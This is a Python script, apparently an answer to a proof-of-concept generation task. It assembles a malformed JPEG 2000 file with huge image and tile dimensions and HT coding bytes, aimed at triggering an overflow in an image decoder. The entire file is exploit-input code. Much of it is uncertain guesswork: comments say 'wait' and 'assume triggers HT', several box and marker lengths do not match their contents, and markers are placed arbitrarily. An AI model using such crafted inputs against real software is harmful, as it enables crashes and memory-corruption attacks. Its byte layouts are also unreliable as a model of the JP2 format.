class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal malformed JP2 PoC to trigger HT_DEC path with large dimensions for overflow
        # This is a crafted example; in practice, adjust based on exact vuln details
        poc = b''
        # JP2 signature box
        poc += b'\x00\x00\x00\x0c' + b'jP  \r\n\x1a\n'
        # ftyp box
        poc += b'\x00\x00\x00\x14ftypjp2 ' + b'jp2 \x00\x00\x00\x00jp2 '
        # jp2h box
        poc += b'\x00\x00\x00\x1bjp2h'  # length 27? wait, ihdr is 22 total for sub
        # ihdr box
        poc += b'\x00\x00\x00\x0Eihdr' + b'\x00\x00\x01\x00' + b'\x00\x00\x01\x00' + b'\x00\x03' + b'\x07' + b'\x01' + b'\x00'  # height 256, width 256, nc=3, bpc=7 (8bit signed?), C=1 RGB, U=0
        # colr box for sRGB
        poc += b'\x00\x00\x00\x15colr' + b'\x00\x01\x00\x00\x00\x00\x73\x52\x47\x42\x00\x00\x00'
        # jp2c box
        poc += b'\x00\x00\x00\x06jp2c'  # length will be adjusted, but for PoC, start codestream
        # Codestream
        # SOC
        poc += b'\xff\x4f'
        # SIZ with large dimensions to trigger large tile/codeblock calc
        lsiz = 47  # standard for 3 comp
        poc += b'\xff\x51' + struct.pack('>H', lsiz) + b'\x90\x01'  # Rsiz for part2 HT? 0x9001 arbitrary for HT
        xsiz = 0xFFFF  # large
        ysiz = 0xFFFF
        xosiz = 0
        yosiz = 0
        xtsiz = 0xFFFF  # large tile
        ytsiz = 0xFFFF
        xtosiz = 0
        ytosiz = 0
        csiz = 3
        poc += struct.pack('>I', xsiz) + struct.pack('>I', ysiz) + struct.pack('>I', xosiz) + struct.pack('>I', yosiz)
        poc += struct.pack('>I', xtsiz) + struct.pack('>I', ytsiz) + struct.pack('>I', xtosiz) + struct.pack('>I', ytosiz)
        poc += struct.pack('>H', csiz)
        # Components Ssiz=8bit signed, Rsiz=Ysiz=1 (no subsampling)
        for _ in range(3):
            poc += b'\x07\x01\x01'  # Ssiz=7 (8bit signed), XRsiz=1, YRsiz=1
        # COD for HT coding style
        # Scod for HT, say 0x42 or arbitrary to trigger HT path
        scod = 0x42  # assume triggers HT
        lcod = 14  # minimal
        poc += b'\xff\x52' + struct.pack('>H', lcod) + struct.pack('>B', scod)
        # SPcod: num layers 1, MCT 0, Ccod with no precinct, SOP/EPH 0, but to large cb, assume bits for large
        poc += struct.pack('>H', 1) + b'\x00'  # layers 1, MCT 0
        ccod = 0x00  # no precinct, no SOP EPH
        poc += struct.pack('>B', ccod)
        dcod = 0  # no DWT
        poc += struct.pack('>B', dcod)
        # No precinct fields since no
        # QCD
        poc += b'\xff\x5c' + struct.pack('>H', 11)  # Lqcd=11 for no DWT, irreversible, G=0
        sqcd = 0x00  # SQtype=0 irreversible, Gqcd=0
        poc += struct.pack('>B', sqcd)
        # No quant steps since D=0
        # For HT, perhaps additional markers, but minimal
        # SOT for tile 0
        poc += b'\xff\x90' + struct.pack('>H', 10) + struct.pack('>I', 0) + b'\x00' + struct.pack('>H', 0)  # Isot=0, Lsot=10, tile 0, Psot=0, TPsot=0
        # Now, to trigger, add malformed packet or data that causes large w,h in HT
        # For PoC, add some tile data
        # SOD
        poc += b'\xff\x93'
        # Dummy packet data to reach T1
        poc += b'\xff\x91'  # SOP? 
        # Add data to cause the decode to allocate
        data_length = 1479 - len(poc)
        poc += b'\x00' * data_length
        # Pad to exact length if needed, but adjust
        # EOC
        poc += b'\xff\xd9'
        return poc
import struct